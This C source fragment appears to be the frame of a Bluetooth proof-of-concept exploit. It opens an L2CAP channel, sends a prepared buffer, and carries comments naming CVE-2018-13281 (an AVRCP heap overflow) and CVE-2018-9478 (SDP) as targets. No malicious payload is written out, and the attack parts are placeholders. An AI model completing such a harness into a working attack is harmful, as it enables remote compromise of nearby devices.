typedef struct
{
    uint16_t psm;
    uint16_t remote_cid;
    uint16_t local_cid;
    uint16_t handle;
} poc_channel_t;

static poc_channel_t channel;

static void handle_hci_event_packet(uint8_t packet_type, uint16_t l2cap_cid, uint8_t *packet, uint16_t size)
{
    bd_addr_t event_addr;
    uint16_t event = hci_event_packet_get_type(packet);
    uint16_t pos = 0;
    switch (event)
    {
    case L2CAP_EVENT_CHANNEL_OPENED:
        l2cap_event_channel_opened_get_address(packet, &event_addr);
        channel.psm = l2cap_event_channel_opened_get_psm(packet);
        channel.local_cid = l2cap_event_channel_opened_get_local_cid(packet);
        channel.remote_cid = l2cap_event_channel_opened_get_remote_cid(packet);
        channel.handle = l2cap_event_channel_opened_get_handle(packet);
        if (l2cap_event_channel_opened_get_status(packet))
        {
            printf("Connection failed: psm[0x%x]\n", channel.psm);
        }
        else
        {
            printf("Connected: psm[0x%x]\n", channel.psm);
        }
        l2cap_request_can_send_now_event(l2cap_cid);
        break;
    case L2CAP_EVENT_CHANNEL_CLOSED:
        printf("Disconnected\n");
        break;
    case L2CAP_EVENT_CAN_SEND_NOW:
        // handle L2CAP data packet
        l2cap_reserve_packet_buffer();
        uint8_t *buffer = l2cap_get_outgoing_buffer();

        // cve-2018-13281 - avrcp heap overflow

        // cve-2018-9478 - sdp
        uint16_t request_len = 0;
        request_len = sdp_client_setup_service_attribute_request(buffer);

        // some others from doc on other computer

        int err = l2cap_send_prepared(channel.local_cid, buffer);
        printf("Error: %d\n", err);
        break;
    default:
        printf("handle_hci_event_packet: 0x%x\n", event);
    }
}

static void l2cap_handler(uint8_t packet_type, uint16_t l2cap_cid, uint8_t *packet, uint16_t size)
{
    printf("l2cap_packet_handler: packet_type[%d] l2cap_cid[%d]\n", packet_type, l2cap_cid);
    switch (packet_type)
    {
    case HCI_EVENT_PACKET:
        handle_hci_event_packet(packet_type, l2cap_cid, packet, size);
    }
}
